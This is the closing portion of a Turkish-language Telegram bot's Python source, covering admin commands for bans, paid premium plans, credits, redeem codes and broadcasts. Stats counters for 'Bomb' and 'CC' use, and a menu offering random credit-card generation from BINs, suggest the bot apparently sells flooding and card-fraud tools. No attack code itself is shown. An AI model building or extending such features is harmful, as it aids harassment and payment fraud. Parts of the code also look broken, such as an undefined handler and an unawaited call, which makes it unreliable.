    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)


# =================== BAN / UNBAN ===================
async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcı banla"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/ban <user_id>`\nÖrnek: `/ban 123456789`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID! Sayısal bir değer girin.")
        return
    
    if target_id == OWNER_ID:
        await update.message.reply_text("❌ Sahibi banlayamazsın!")
        return
    if target_id in ADMIN_IDS:
        await update.message.reply_text("❌ Bir admini banlayamazsın!")
        return
    
    exists = user_exists(target_id)
    if not exists:
        db_exec("INSERT OR REPLACE INTO users (user_id, username, first_name, last_name, banned, join_date) VALUES (?, ?, ?, ?, 1, datetime('now'))",
                (target_id, "Banned", "Banlı", "Kullanıcı"))
        await update.message.reply_text(f"✅ `{target_id}` ID'li kullanıcı banlandı (yeni kayıt oluşturuldu).", parse_mode=ParseMode.MARKDOWN)
        return
    
    db_exec("UPDATE users SET banned = 1 WHERE user_id = ?", (target_id,))
    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=f"🚫 *Hesabınız Banlandı!*\n\nYetkili tarafından engellendiniz.\nİtiraz için: @lunasloury",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass
    
    await update.message.reply_text(f"✅ `{target_id}` ID'li kullanıcı **banlandı**!", parse_mode=ParseMode.MARKDOWN)


async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcının banını kaldır"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/unban <user_id>`\nÖrnek: `/unban 123456789`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID!")
        return
    
    if not user_exists(target_id):
        await update.message.reply_text(f"❌ `{target_id}` ID'li kullanıcı bulunamadı.", parse_mode=ParseMode.MARKDOWN)
        return
    
    u = get_user(target_id)
    if u and u[7] == 0:
        await update.message.reply_text(f"ℹ️ `{target_id}` zaten banlı değil.", parse_mode=ParseMode.MARKDOWN)
        return
    
    db_exec("UPDATE users SET banned = 0 WHERE user_id = ?", (target_id,))
    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=f"✅ *Hadi Şanslısın Banınız Kaldırıldı!*\n\nTekrar hoşgeldiniz! Botu kullanmaya devam edebilirsiniz.",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass
    
    await update.message.reply_text(f"✅ `{target_id}` ID'li kullanıcının **banı kaldırıldı**!", parse_mode=ParseMode.MARKDOWN)


# =================== KULLANICI BİLGİSİ ===================
async def admin_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcı bilgisi göster"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/kullanici <user_id>`\nÖrnek: `/kullanici 123456789`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID!")
        return
    
    u = get_user(target_id)
    if not u:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat?chat_id={target_id}"
            resp = requests.get(url, timeout=10)
            data = resp.json()
            if data.get("ok"):
                result = data["result"]
                text = f"""
👤 *KULLANICI BİLGİSİ (API)*
🆔 ID: `{target_id}`
👤 İsim: {result.get('first_name', '?')} {result.get('last_name', '')}
📛 Kullanıcı: @{result.get('username', 'Yok')}
⚠️ Veritabanında kayıtlı değil.
"""
                await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
                return
        except:
            pass
        
        await update.message.reply_text(f"❌ `{target_id}` bulunamadı.", parse_mode=ParseMode.MARKDOWN)
        return
    
    premium_status = "✅ PREMİUM" if u[4] == 1 else "❌ ÜCRETSİZ"
    ban_status = "🚫 BANLI" if u[7] == 1 else "✅ AKTİF"
    admin_status = "👑 SAHİP" if target_id == OWNER_ID else ("⚙️ ADMIN" if u[8] == 1 else "🔰 KULLANICI")
    
    text = f"""
╔══════════════════════╗
║   👤 KULLANICI #{target_id}
╚══════════════════════╝
━━━━━━━━━━━━━━━━━━━━━
📛 *KİMLİK*
🆔 ID: `{u[0]}`
👤 İsim: {u[2] or '?'} {u[3] or ''}
📛 Kullanıcı: @{u[1] if u[1] != 'None' else 'Yok'}
🎖️ Yetki: {admin_status}
━━━━━━━━━━━━━━━━━━━━━
⭐ *ÜYELİK*
👑 Durum: {premium_status}
⏰ Bitiş: `{u[5] or 'Yok'}`
⭐ Kredi: {u[6]}
🚫 Ban: {ban_status}
━━━━━━━━━━━━━━━━━━━━━
📅 Katılım: {u[9] or '?'}
"""
    
    keyboard = []
    if u[7] == 0:
        keyboard.append([InlineKeyboardButton("🔨 Banla", callback_data=f"admin_ban_{target_id}")])
    else:
        keyboard.append([InlineKeyboardButton("✅ Ban Kaldır", callback_data=f"admin_unban_{target_id}")])
    keyboard.append([InlineKeyboardButton("🎁 Premium Ver", callback_data=f"admin_prem_{target_id}")])
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN)


# =================== PREMIUM VER / AL / KREDİ ===================
async def admin_premiumver(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcıya premium ver"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❌ Kullanım: `/premiumver <id> <gün>`\nÖrnek: `/premiumver 123456789 30`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
        if days < 1 or days > 99999:
            raise ValueError
    except:
        await update.message.reply_text("❌ Geçersiz ID veya gün! (1-99999)")
        return
    
    if not user_exists(target_id):
        await update.message.reply_text(f"❌ `{target_id}` bulunamadı!", parse_mode=ParseMode.MARKDOWN)
        return
    
    now = datetime.datetime.now()
    u = get_user(target_id)
    
    if u and u[4] == 1 and u[5]:
        try:
            existing = datetime.datetime.strptime(u[5], "%Y-%m-%d %H:%M:%S")
            new_until = existing + datetime.timedelta(days=days) if existing > now else now + datetime.timedelta(days=days)
        except:
            new_until = now + datetime.timedelta(days=days)
    else:
        new_until = now + datetime.timedelta(days=days)
    
    until_str = new_until.strftime("%Y-%m-%d %H:%M:%S")
    db_exec("UPDATE users SET is_premium = 1, premium_until = ? WHERE user_id = ?", (until_str, target_id))
    
    plan_name = "Süresiz VİP" if days >= 9999 else f"{days} Gün"
    
    try:
        await context.bot.send_message(
            chat_id=target_id,
            text=f"🎉 *PREMIUM AKTİF!*\n\n👑 Yetkili: {user.first_name}\n📦 Plan: {plan_name}\n⏰ Bitiş: {new_until.strftime('%d/%m/%Y %H:%M')}\n\n💬 Destek: @LunaVipDestek",
            parse_mode=ParseMode.MARKDOWN
        )
        notify = "✅ Bildirim gönderildi."
    except Exception as e:
        notify = f"⚠️ Mesaj gönderilemedi: {str(e)[:50]}"
    
    await update.message.reply_text(f"✅ `{target_id}` → **{plan_name}** premium verildi!\n⏰ {new_until.strftime('%d/%m/%Y %H:%M')}\n{notify}", parse_mode=ParseMode.MARKDOWN)


async def admin_take_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcıdan premiumu al"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/premiumal <id>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        target_id = int(context.args[0])
    except:
        await update.message.reply_text("❌ Geçersiz ID!")
        return
    
    if not user_exists(target_id):
        await update.message.reply_text(f"❌ `{target_id}` bulunamadı!", parse_mode=ParseMode.MARKDOWN)
        return
    
    u = get_user(target_id)
    if u and u[4] == 0:
        await update.message.reply_text(f"ℹ️ `{target_id}` zaten premium değil.", parse_mode=ParseMode.MARKDOWN)
        return
    
    old_until = u[5] if u else "?"
    db_exec("UPDATE users SET is_premium = 0, premium_until = NULL WHERE user_id = ?", (target_id,))
    
    try:
        await context.bot.send_message(chat_id=target_id, text=f"❌ *Premium üyeliğiniz iptal edildi!*\nEski bitiş: {old_until}\nİtiraz: @lunasloury", parse_mode=ParseMode.MARKDOWN)
    except:
        pass
    
    await update.message.reply_text(f"✅ `{target_id}` premiumu **alındı** (iptal). Eski: {old_until}", parse_mode=ParseMode.MARKDOWN)


async def admin_give_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kullanıcıya kredi ver"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("❌ Kullanım: `/krediver <id> <miktar>`\nÖrnek: `/krediver 123456789 50`", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
        if amount < 1 or amount > 100000:
            raise ValueError
    except:
        await update.message.reply_text("❌ Geçersiz ID veya miktar! (1-100000)")
        return
    
    if not user_exists(target_id):
        await update.message.reply_text(f"❌ `{target_id}` bulunamadı!", parse_mode=ParseMode.MARKDOWN)
        return
    
    add_credits(target_id, amount)
    new_credits = get_user_credits(target_id)
    
    try:
        await context.bot.send_message(chat_id=target_id, text=f"⭐ *+{amount} kredi yüklendi!*\n📊 Bakiye: {new_credits} kredi", parse_mode=ParseMode.MARKDOWN)
    except:
        pass
    
    await update.message.reply_text(f"✅ `{target_id}` → +{amount} kredi verildi!\n📊 Bakiye: {new_credits}", parse_mode=ParseMode.MARKDOWN)


# =================== KOD İŞLEMLERİ ===================
async def admin_generate_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Premium kodu oluştur"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args or context.args[0].lower() not in PLANS:
        plans_list = "\n".join([f"• `{k}` → {v['name']} ({v['days']}gün)" for k, v in PLANS.items()])
        await update.message.reply_text(f"❌ Kullanım: `/kod <plan>`\n\n📦 *Planlar:*\n{plans_list}\n\nÖrnek: `/kod 1ay`", parse_mode=ParseMode.MARKDOWN)
        return
    
    plan = context.args[0].lower()
    plan_info = PLANS[plan]
    code = generate_premium_code(plan, plan_info["days"], user.id)
    
    await update.message.reply_text(
        f"✅ *Premium Kodu Oluşturuldu!*\n\n"
        f"📦 {plan_info['name']}\n"
        f"⏰ {plan_info['days']} gün | 💰 {plan_info['price']} TL\n\n"
        f"🔑 `{code}`\n\n"
        f"📌 Bot'a gir → 👑 Premium → Kod Kullan → `{code}`",
        parse_mode=ParseMode.MARKDOWN
    )


async def admin_list_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tüm kodları listele"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    codes = db_fetch("SELECT * FROM premium_codes ORDER BY created_at DESC LIMIT 50")
    if not codes:
        await update.message.reply_text("📭 Hiç kod oluşturulmamış.")
        return
    
    used = sum(1 for c in codes if c[5] == 1)
    unused = sum(1 for c in codes if c[5] == 0)
    
    text = f"📋 *PREMIUM KODLAR (son 50)*\n📊 Top: {len(codes)} | ✅ Kullanılan: {used} | 🆕 Kalan: {unused}\n\n"
    for c in codes[:30]:
        s = "✅" if c[5] == 1 else "🆕"
        text += f"{s} `{c[0]}` | {c[1]} | {c[3]}g | {c[6] or ''}\n"
    text += "\n🗑️ `/kodsil KOD`"
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def admin_delete_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kodu sil"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/kodsil <kod>`", parse_mode=ParseMode.MARKDOWN)
        return
    
    code = context.args[0].upper()
    c = db_fetch("SELECT * FROM premium_codes WHERE code = ?", (code,), one=True)
    if not c:
        await update.message.reply_text(f"❌ `{code}` bulunamadı!", parse_mode=ParseMode.MARKDOWN)
        return
    
    db_exec("DELETE FROM premium_codes WHERE code = ?", (code,))
    await update.message.reply_text(f"🗑️ `{code}` silindi!", parse_mode=ParseMode.MARKDOWN)


# =================== DUYURU ===================
async def admin_announce(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Tüm kullanıcılara duyuru yap"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    if not context.args:
        await update.message.reply_text("❌ Kullanım: `/duyuru <mesaj>`\nÖrnek: `/duyuru Bot güncellendi!`", parse_mode=ParseMode.MARKDOWN)
        return
    
    message = " ".join(context.args)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db_exec("INSERT INTO announcements (text, created_by, created_at, target) VALUES (?, ?, ?, 'all')", (message, user.id, now))
    
    await update.message.reply_text(f"📢 *Duyuru gönderiliyor...*\n{message}", parse_mode=ParseMode.MARKDOWN)
    
    users = db_fetch("SELECT user_id FROM users WHERE banned = 0")
    sent = failed = 0
    
    for u_row in users:
        uid = u_row[0]
        try:
            await context.bot.send_message(chat_id=uid, text=f"📢 *ADMİNİN MESAJİ VAR*\n\n{message}\n\n💬 @lunasloury", parse_mode=ParseMode.MARKDOWN)
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    await update.message.reply_text(f"✅ *Duyuru tamam!*\n📤 Gönderilen: {sent}\n❌ Başarısız: {failed}", parse_mode=ParseMode.MARKDOWN)


# =================== İSTATİSTİK ===================
async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot istatistiklerini göster"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    total = db_fetch("SELECT COUNT(*) FROM users", one=True)[0]
    banned = db_fetch("SELECT COUNT(*) FROM users WHERE banned = 1", one=True)[0]
    premium = db_fetch("SELECT COUNT(*) FROM users WHERE is_premium = 1", one=True)[0]
    queries = db_fetch("SELECT COUNT(*) FROM query_logs", one=True)[0]
    bomb = db_fetch("SELECT COUNT(*) FROM bomb_logs", one=True)[0]
    cc = db_fetch("SELECT COALESCE(SUM(count),0) FROM cc_logs", one=True)[0]
    codes = db_fetch("SELECT COUNT(*) FROM premium_codes", one=True)[0]
    used_c = db_fetch("SELECT COUNT(*) FROM premium_codes WHERE is_used = 1", one=True)[0]
    
    uptime = datetime.datetime.now() - stats["start_time"]
    days = uptime.days
    hours = uptime.seconds // 3600
    
    text = f"""
╔══════════════════════════════════╗
║       📊 BOT İSTATİSTİKLERİ        ║
╚══════════════════════════════════╝

⏱️ Çalışma: {days}g {hours}s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 Kullanıcı: {total}
🚫 Banlı: {banned}
👑 Premium: {premium}
🔰 Ücretsiz: {total - premium}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 Sorgu: {queries}
💣 Bomb: {bomb}
💳 CC: {cc}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 Kod: {codes} (✅ {used_c} / 🆕 {codes - used_c})
"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


# =================== GRUP PREMIUM ===================
async def admin_group_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gruba premium dağıt"""
    user = update.effective_user
    if not is_admin_user(user.id):
        return
    
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❌ Kullanım: `/gruppremium <gün> <kişi>`\n*Bu komutu grupta kullanın!*", parse_mode=ParseMode.MARKDOWN)
        return
    
    try:
        days = int(args[0])
        max_claims = int(args[1])
        if days < 1 or days > 3650:
            raise ValueError
        if max_claims < 1 or max_claims > 100:
            raise ValueError
    except:
        await update.message.reply_text("❌ Geçersiz! gün:1-3650, kişi:1-100")
        return
    
    chat = update.effective_chat
    if chat.type not in [ChatType.GROUP, ChatType.SUPERGROUP]:
        await update.message.reply_text("❌ Bu komut sadece **gruplarda** kullanılabilir!", parse_mode=ParseMode.MARKDOWN)
        return
    
    code_suffix = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(CODE_LENGTH))
    code = f"{CODE_PREFIX}{code_suffix}"
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    plan_name = f"grup-{days}g-{max_claims}kisi"
    
    db_exec("INSERT INTO premium_codes (code, plan_type, days, created_by, created_at) VALUES (?, ?, ?, ?, ?)", (code, plan_name, days, user.id, now))
    db_exec("INSERT INTO group_premium (group_id, code, days, max_claims, created_by, created_at) VALUES (?, ?, ?, ?, ?, ?)", (chat.id, code, days, max_claims, user.id, now))
    
    plan_display = f"{days} Gün" if days < 365 else (f"{days//365} Yıl" if days % 365 == 0 else f"{days} Gün")
    if days >= 9999:
        plan_display = "Süresiz VİP"
    
    msg = await update.message.reply_text(
        f"🎉 *PREMIUM DAĞITIMI!*\n\n"
        f"📦 {plan_display} | 👥 {max_claims} kişi\n"
        f"📍 {chat.title}\n\n"
        f"🔑 `{code}`\n\n"
        f"📌 @{BOT_USERNAME} → /start → 👑 Premium → Kod Kullan\n\n"
        f"⚠️ İlk {max_claims} kişi! 5 dk geçerli.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    def cleanup():
        time.sleep(300)
        try:
            c = db_fetch("SELECT is_used FROM premium_codes WHERE code = ?", (code,), one=True)
            if c and c[0] == 0:
                db_exec("DELETE FROM premium_codes WHERE code = ?", (code,))
                db_exec("UPDATE group_premium SET is_active = 0 WHERE code = ?", (code,))
                used_count = db_fetch("SELECT claimed_count FROM group_premium WHERE code = ?", (code,), one=True)
                uc = used_count[0] if used_count else 0
                try:
                    context.bot.edit_message_text(chat_id=chat.id, message_id=msg.message_id,
                        text=f"⏰ *Dağıtım sona erdi!* 👥 {uc}/{max_claims} kişi kullandı.", parse_mode=ParseMode.MARKDOWN)
                except:
                    pass
        except:
            pass
    
    threading.Thread(target=cleanup, daemon=True).start()


# =================== ADMIN CALLBACK ===================
async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin callback butonları"""
    query = update.callback_query
    user = update.effective_user
    data = query.data
    
    if not is_admin_user(user.id):
        await query.answer("🚫 Yetkiniz yok!")
        return
    
    await query.answer()
    
    if data == "admin_stats":
        total = db_fetch("SELECT COUNT(*) FROM users", one=True)[0]
        prem = db_fetch("SELECT COUNT(*) FROM users WHERE is_premium = 1", one=True)[0]
        q = db_fetch("SELECT COUNT(*) FROM query_logs", one=True)[0]
        text = f"📊 *HIZLI İSTATİSTİK*\n👥 {total} | 👑 {prem} | 🔍 {q}\n💣 {db_fetch('SELECT COUNT(*) FROM bomb_logs', one=True)[0]} | 💳 {db_fetch('SELECT COALESCE(SUM(count),0) FROM cc_logs', one=True)[0]}"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
    
    elif data == "admin_users":
        users = db_fetch("SELECT user_id, username, first_name, is_premium, banned FROM users ORDER BY user_id DESC LIMIT 20")
        text = "📋 *Son 20 Kullanıcı*\n"
        for u in users:
            s = "👑" if u[3] == 1 else "🔰"
            b = "🚫" if u[4] == 1 else ""
            text += f"\n`{u[0]}` {s}{b} {u[2] or '?'}"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
    
    elif data == "admin_codes":
        codes = db_fetch("SELECT code, plan_type, is_used, used_by FROM premium_codes ORDER BY created_at DESC LIMIT 10")
        text = "🔑 *Son 10 Kod*\n"
        for c in codes:
            s = "✅" if c[2] == 1 else "🆕"
            text += f"\n{s} `{c[0]}` | {c[1]} | {c[3] or '?'}"
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
    
    elif data == "admin_announce":
        await query.edit_message_text("📢 `/duyuru <mesaj>` yazın.", parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="admin_back")]]))
    
    elif data == "admin_back":
        await query.edit_message_text("⚙️ `/admin` yazın.", parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("admin_ban_"):
        uid = int(data.split("_")[2])
        db_exec("UPDATE users SET banned = 1 WHERE user_id = ?", (uid,))
        await query.edit_message_text(f"✅ `{uid}` banlandı!", parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("admin_unban_"):
        uid = int(data.split("_")[2])
        db_exec("UPDATE users SET banned = 0 WHERE user_id = ?", (uid,))
        await query.edit_message_text(f"✅ `{uid}` ban kalktı!", parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("admin_prem_"):
        uid = int(data.split("_")[2])
        await query.edit_message_text(f"🎁 `/premiumver {uid} <gün>`", parse_mode=ParseMode.MARKDOWN)





async def show_cc_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """CC menüsü göster - DÜZELTİLDİ"""
    query = update.callback_query
    user = update.effective_user
    await query.answer()
    
    # context.user_data'ya erişim için context kullan
    context.user_data["awaiting_cc"] = user.id
    
    text = """
💳 *RANDOM CC & BIN SORGULAMA*

━━━━━━━━━━━━━━━━━━━━━
📌 *Komutlar:*
`/bin <BIN>` — BIN sorgula (6-8 hane)
`/cc` — Rastgele CC oluştur
`/cc <BIN>` — Belirli BIN'den CC

━━━━━━━━━━━━━━━━━━━━━
📌 *Örnek BIN'ler:*
• `424242` — VISA Test
• `400005` — VISA Classic
• `520000` — MasterCard
• `378282` — American Express

━━━━━━━━━━━━━━━━━━━━━
⭐ Kredi gerektirmez!
"""
    await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Rastgele CC", callback_data="cc_random")],
            [InlineKeyboardButton("🔍 BIN Sorgula", callback_data="cc_bin_query")],
            [InlineKeyboardButton("🔙 Geri", callback_data="main_menu")]
        ]))



# =================== ANA FONKSİYON (HATASIZ VERSİYON) ===================
def main():
    init_db()
    logger.info("✅ Database initialized")
    
    # Application oluştur
    application = Application.builder().token(BOT_TOKEN).build()
    
    # --- TEMEL KOMUTLAR ---
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("yardim", help_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # --- ADMİN KOMUTLARI (İsimleri aşağıdakilerle birebir eşle) ---
    application.add_handler(CommandHandler("admin", admin_panel))
    application.add_handler(CommandHandler("panel", admin_panel))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("unban", unban_user))
    application.add_handler(CommandHandler("premiumver", admin_premiumver))
    application.add_handler(CommandHandler("premiumal", admin_take_premium))
    application.add_handler(CommandHandler("krediver", admin_give_credits))
    
    # DİKKAT: Eğer yukarıda 'admin_user_list' yaptıysan buradaki 's' harfini sil.
    # Senin son hatan 'admin_users_list' ismini bulamadığı içindi.
    # Dosyandaki fonksiyon adı 'admin_user_list' ise aşağıdaki satırı kullan:
    application.add_handler(CommandHandler("kullanicilar", admin_user_list)) 
    
    application.add_handler(CommandHandler("kullanici", admin_user_info))
    application.add_handler(CommandHandler("kod", admin_generate_code))
    application.add_handler(CommandHandler("kodlar", admin_list_codes))
    application.add_handler(CommandHandler("duyuru", admin_announce))
    application.add_handler(CommandHandler("istatistik", admin_stats))
    application.add_handler(CommandHandler("stats", admin_stats))
    application.add_handler(CommandHandler("gruppremium", admin_group_premium))

    # --- CALLBACK & MESAJ İŞLEYİCİLER ---
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # --- ARKA PLAN VE BAŞLATMA ---
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    logger.info(f"🤖 {BOT_NAME} başlatıldı!")
    print(f"🚀 Bot Hazır! Sahip ID: {OWNER_ID}")

    # Botu çalıştıran ana döngü
    application.run_polling()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"❌ Çalıştırma Hatası: {e}")

